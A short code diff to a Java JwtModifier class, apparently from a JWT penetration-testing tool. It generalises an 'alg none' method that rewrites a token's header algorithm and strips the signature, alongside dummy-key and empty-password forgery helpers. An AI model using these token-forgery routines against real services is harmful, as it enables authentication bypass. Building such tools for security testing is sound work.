@@ -60,14 +60,15 @@ public class JwtModifier {
         String[] jwtParts = jwt.split("\\.");
         return createJwtFromString(jwtParts[0], jwtParts[1], dummyKey.toString());
     }
-    //Todo: implement all other algorithm none attacks
-    public String algNone(String jwt) {
+
+    public String algNone(String jwt, String alg) {
         String[] jwtParts = jwt.split("\\.");
         JSONObject header = new JSONObject(decodeBase64Url(jwtParts[0]));
 
-        header.put("alg", "nOnE");
+        header.put("alg", alg);
         return encodeBase64Url(header.toString()) + '.' + jwtParts[1] + '.';
     }
+
 
     public String emptyPassword(String jwt){
         String[] jwtParts = jwt.split("\\.");
